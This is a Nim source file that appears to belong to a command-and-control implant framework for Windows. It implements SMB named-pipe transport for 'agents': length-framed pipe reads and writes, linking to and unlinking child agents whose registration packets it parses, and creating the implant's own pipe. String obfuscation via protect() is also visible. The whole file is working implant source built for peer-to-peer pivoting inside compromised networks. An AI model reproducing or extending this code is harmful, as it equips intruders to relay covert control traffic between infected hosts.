import winim/lean
import system, tables
import ../../utils/io
import ../../../../common/[utils, serialize]
import ../../../../types/[common, agent]

const PIPE_BUFFER_MAX = 0x10000 # 65536 

proc pipeWrite*(hPipe: HANDLE, data: seq[byte]): bool {.discardable.} = 
    var
        dwBytesWritten: DWORD = 0
        dwTotal: DWORD = 0
        dwSize: DWORD = cast[DWORD](data.len())

    # Write data length
    if WriteFile(hPipe, cast[LPCVOID](addr dwSize), 4, addr dwBytesWritten, NULL) == FALSE:
        return false

    # Write chunks
    while dwTotal < dwSize:             
        if WriteFile(hPipe, cast[LPCVOID](addr data[dwTotal]), min(dwSize - dwTotal, PIPE_BUFFER_MAX), addr dwBytesWritten, NULL) == FALSE: 
            return false
        dwTotal += dwBytesWritten

    FlushFileBuffers(hPipe)
    return true

proc pipeRead*(hPipe: HANDLE): seq[byte] = 
    var
        dwBytesRead: DWORD = 0
        dwTotal: DWORD = 0
        dwSize: DWORD = 0

    # Read data length
    if ReadFile(hPipe, cast[LPVOID](addr dwSize), 4, addr dwBytesRead, NULL) == FALSE:
        return @[]

    if dwSize == 0:
        return @[]

    # Read chunks
    result = newSeq[byte](dwSize)
    while dwTotal < dwSize:            
        if ReadFile(hPipe, cast[LPVOID](addr result[dwTotal]), min(dwSize - dwTotal, PIPE_BUFFER_MAX), addr dwBytesRead, NULL) == FALSE:
            if GetLastError() != ERROR_MORE_DATA:
                return @[]
        dwTotal += dwBytesRead

proc smbRead*(ctx: AgentCtx, hPipe: HANDLE): string = 
    var dwSize: DWORD = 0

    if PeekNamedPipe(hPipe, NULL, 0, NULL, addr dwSize, NULL) == FALSE:
        when defined(TRANSPORT_SMB):
            ctx.registered = false
            DisconnectNamedPipe(ctx.transport.hPipe)
            CloseHandle(ctx.transport.hPipe)
            ctx.transport.hPipe = 0
        return ""

    when defined(TRANSPORT_SMB):
        # SMB transport agent: block and read the full framed message
        return Bytes.toString(hPipe.pipeRead())
    else:
        # Parent agent polling linked child: non-blocking, only read if data available
        if dwSize == 0:
            return ""
        return Bytes.toString(hPipe.pipeRead())

# Agent linking
proc link*(ctx: AgentCtx, pipeName: string): seq[byte] =   
    var 
        hPipe: HANDLE = 0
        dwSize: DWORD = 0
        data: seq[byte]

    hPipe = CreateFileW(+$pipeName, GENERIC_READ or GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, 0)
    if hPipe == INVALID_HANDLE_VALUE: 
        raise newException(CatchableError, GetLastError().getError())
    
    if GetLastError() == ERROR_PIPE_BUSY:
        if WaitNamedPipeW(+$pipeName, 5000) == FALSE:
            raise newException(CatchableError, GetLastError().getError())

    # Wait for registration packet
    while true:
        if PeekNamedPipe(hPipe, NULL, 0, NULL, addr dwSize, NULL) == FALSE:
            CloseHandle(hPipe)
            raise newException(CatchableError, GetLastError().getError())

        if dwSize > 0:
            data = hPipe.pipeRead()
            if data.len() == 0:
                CloseHandle(hPipe)
                raise newException(CatchableError, protect("Failed to read registration packet."))
            break 
    
    # Parse registration packet
    var unpacker = Unpacker.init(Bytes.toString(data))
    discard unpacker.getUint8()
    discard unpacker.getUint32()
    let agentId = unpacker.deserializeHeader().agentId

    ctx.links[cast[uint32](agentId)] = cast[uint32](hPipe)

    return data
    
proc unlink*(ctx: AgentCtx, agentId: string) = 
    if not ctx.links.hasKey(string.toUuid(agentId)): 
        raise newException(CatchableError, protect("Linked agent not found."))
    
    let hPipe = cast[HANDLE](ctx.links[string.toUuid(agentId)])
    if CloseHandle(hPipe) == FALSE:
        raise newException(CatchableError, GetLastError().getError())
          
    ctx.links.del(string.toUuid(agentId))

when defined(TRANSPORT_SMB):
    type 
        SMB_PIPE_SEC_ATTR = object 
            Sid: PSID 
            SidLow: PSID 
            SAcl: PACL 
            SecDec: PSECURITY_DESCRIPTOR
        
        PSMB_PIPE_SEC_ATTR = ptr SMB_PIPE_SEC_ATTR
    
    proc openSmbSecurityAttributes(smbSecAttr: PSMB_PIPE_SEC_ATTR, secAttr: PSECURITY_ATTRIBUTES) = 
        discard 
    
    proc freeSmbSecurityAttributes(smbSecAttr: PSMB_PIPE_SEC_ATTR) = 
        discard
    
    proc createPipe*(ctx: AgentCtx) = 
        var 
            smbSecAttr: SMB_PIPE_SEC_ATTR
            secAttr: SECURITY_ATTRIBUTES  
        
        openSmbSecurityAttributes(addr smbSecAttr, addr secAttr)
        
        ctx.transport.hPipe = CreateNamedPipeW(
            +$ctx.transport.pipe,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE or PIPE_READMODE_BYTE or PIPE_WAIT,  # byte mode for framing
            PIPE_UNLIMITED_INSTANCES,
            PIPE_BUFFER_MAX,
            PIPE_BUFFER_MAX,
            0,
            addr secAttr
        )
        
        freeSmbSecurityAttributes(addr smbSecAttr)
        
        if ctx.transport.hPipe == INVALID_HANDLE_VALUE:
            ctx.transport.hPipe = 0
            raise newException(CatchableError, protect("Failed to create pipe"))
    
    proc smbWrite*(ctx: AgentCtx, data: seq[byte]): bool = 
        if ctx.transport.hPipe == 0:
            ctx.createPipe()
            print protect("Waiting for connection.")
            if ConnectNamedPipe(ctx.transport.hPipe, NULL) == FALSE:
                if GetLastError() != ERROR_PIPE_CONNECTED:
                    CloseHandle(ctx.transport.hPipe)
                    ctx.transport.hPipe = 0
                    return false
            return ctx.transport.hPipe.pipeWrite(data)
        
        if not ctx.transport.hPipe.pipeWrite(data):
            let err = GetLastError()
            if err == ERROR_NO_DATA:
                CloseHandle(ctx.transport.hPipe)
                ctx.transport.hPipe = 0
                return false
        
        return true